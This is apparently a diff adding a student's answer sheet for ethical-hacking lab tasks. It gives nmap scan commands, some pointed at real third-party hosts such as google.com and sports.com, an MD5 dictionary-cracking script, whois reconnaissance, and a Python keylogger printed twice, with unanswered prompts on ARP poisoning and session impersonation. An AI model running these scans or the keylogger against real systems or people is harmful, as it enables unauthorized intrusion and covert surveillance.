@@ -1,0 +1,241 @@
+a. Use NMap to perform an ACK scan to determine if a port is filtered, unfiltered, or open.
+
+nmap -sA 192.168.1.10 -p 80
+
+-sA → Performs an ACK scan.
+<target-ip> → Replace this with the IP address of your target.
+-p <port> → Specify the port number you want to scan.
+
+
+B.Perform SYN, FIN, NULL, and XMAS scans to identify open ports and their Characteristics
+
+1.SYN Scan
+nmap -sS <target-ip>
+
+2.FIN Scan
+nmap -sF <target-ip>
+
+3.NULL Scan
+nmap -sN <target-ip>
+
+4. XMAS Scan
+nmap -sX <target-ip>
+
+------------------------------------------------------------------------------------------------
+A. Use NMap to perform an ACK scan to determine if a port is filtered, unfiltered, or open
+
+nmap -sA -p <port> <target-ip>
+eg:-
+nmap -sA -p 80 192.168.1.10
+
+B. Crack the password using:
+1.Dictionary Attack 
+
+import hashlib
+# Hashed password (target)
+target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"	
+# Sample dictionary (you can load from a file)
+dictionary = ["123456", "admin", "letmein", "password", "welcome"]
+for word in dictionary:
+    hashed_word = hashlib.md5(word.encode()).hexdigest()
+    if hashed_word == target_hash:
+        print(f"[+] Password found: {word}")
+        break
+else:
+    print("[-] Password not found.")
+
+
+2.Cryptool 
+
+------------------------------------------------------------------------------------------------
+
+Use Wireshark to capture network traffic on a specific network interface. Analyze the captured packets to extract relevant information and identify potential security issue
+
+http
+
+------------------------------------------------------------------------------------------------
+A.Use Cryptool to perform Encryption and Decryption of Password
+
+
+
+B.Perform Network Analysis using following commands
+1. ipconfig
+-->  ipconfig
+2.ping
+--> ping google.com
+3.netstat
+--> netstat -an
+4.traceroute
+--> tracert google.com
+
+------------------------------------------------------------------------------------------------
+
+A. Execute the following tasks: 
+a) Perform network scan. 
+-->  nmap -sP 192.168.1.0/24
+b) Find active machines. 
+nmap -sn 192.168.1.0/24
+c) Find number of hops from source to destination. 
+traceroute google.com
+d) Perform ping command
+ping google.com
+
+
+B. Find the number of hops from your PC to www.prestashop.com
+--> tracert www.prestashop.com
+
+------------------------------------------------------------------------------------------------
+A. Perform Reconnaisance to obtain following: [20] 
+a) The domain name 
+--> prestashop.com
+b) The URL 
+--> https://www.prestashop.com/
+c) Registrant name – Who registered the domain 
+--> whois prestashop.com
+d) Email address (from who is)
+--> Registrant Email: contact@prestashop.com
+e)IP address
+--> nslookup www.prestashop.com  or ping www.prestashop.com
+
+B. Use ARP poisoning to crack password of email account
+
+------------------------------------------------------------------------------------------------
+A. Install and configure the Tamper Data add-on in Firefox. Intercept and modify HTTP requests to impersonate a user's session
+
+
+B. Demonstrate the use of wireshark in sniffing the data
+Source IP
+Destination IP
+Protocol (HTTP, TCP, DNS, etc.)
+Length and Info
+
+------------------------------------------------------------------------------------------------
+A. Create simple keylogger using python and record keys used by user
+
+from pynput.keyboard import Listener
+import logging
+from datetime import datetime
+def configure_logging():
+    """Configure logging settings for the keylogger"""
+    log_file = "keylog.txt"
+    logging.basicConfig(
+        filename=log_file,
+        level=logging.DEBUG,
+        format='%(asctime)s: %(message)s',
+        datefmt='%Y-%m-%d %H:%M:%S'
+    )
+def on_press(key):
+    """Callback function for key press events"""
+    try:
+        logging.info(f"Key pressed: {key}")
+    except Exception as e:
+        print(f"Error logging key press: {e}")
+def start_keylogger():
+    """Start the keylogger listener"""
+    print(f"Keylogger started. Logging to keylog.txt. Press ESC to stop.")
+    
+    with Listener(on_press=on_press) as listener:
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            print("\nKeylogger stopped by user")
+if __name__ == "__main__":
+    configure_logging()
+    start_keylogger()
+
+
+B.Find the Reconnaissance on www.google.com as following: [20] 
+a) Determine the network range 
+--> whois google.com
+
+Look for the CIDR block or network range in the net section of the output. Example:
+NetRange:       8.8.8.0 - 8.8.8.255
+
+b) Identify active machines 
+--> nmap -sn 8.8.8.0/24
+
+c) Discover open ports and access points 
+--> nmap google.com
+
+d) Uncover services on ports. 
+--> nmap -sV google.com
+
+e) Server name
+nmap --script=http-server-header google.com
+curl -I web name
+Look for the Server header in the response:
+Server: gws
+
+------------------------------------------------------------------------------------------------
+A. Use Wireshark to capture network traffic on a specific network interface. 
+HTTP traffic: http
+DNS traffic: dns
+ICMP packets: icmp
+
+B. Use cain and abel to crack windows password by using Dictionary attack
+
+------------------------------------------------------------------------------------------------
+A. Using ARP poisoning to crack password of email account
+
+B.Perform network scanning on www.sports.com to find number of active machines and no of packets send
+
+nmap -sn sports.com
+ip.addr == <sports.com IP>
+
+------------------------------------------------------------------------------------------------
+A. Using Nmap (ZenMap) perform the following scans on the system: 
+a. Intense scan 
+--> nmap -T4 -A -v <target>
+b. Xmas Scan 
+--> nmap -sX <target>
+c. Null Scan
+--> nmap -sN <target>
+
+B. Create simple keylogger using python and record keys used by user
+
+from pynput.keyboard import Listener
+import logging
+from datetime import datetime
+
+def configure_logging():
+    """Configure logging settings for the keylogger"""
+    log_file = "keylog.txt"
+    logging.basicConfig(
+        filename=log_file,
+        level=logging.DEBUG,
+        format='%(asctime)s: %(message)s',
+        datefmt='%Y-%m-%d %H:%M:%S'
+    )
+
+def on_press(key):
+    """Callback function for key press events"""
+    try:
+        logging.info(f"Key pressed: {key}")
+    except Exception as e:
+        print(f"Error logging key press: {e}")
+
+def start_keylogger():
+    """Start the keylogger listener"""
+    print(f"Keylogger started. Logging to keylog.txt. Press ESC to stop.")
+    
+    with Listener(on_press=on_press) as listener:
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            print("\nKeylogger stopped by user")
+
+if __name__ == "__main__":
+    configure_logging()
+    start_keylogger()
+
+------------------------------------------------------------------------------------------------
+A. Use Ping and IP Scanner to scan the network. List your findings
+--> ping <target-ip-address>
+
+------------------------------------------------------------------------------------------------
+
+A. Find the number of hops taken by your system to send information from your computer to www.google.com
+--> tracert www.google.com
+
+------------------------------------------------------------------------------------------------
+
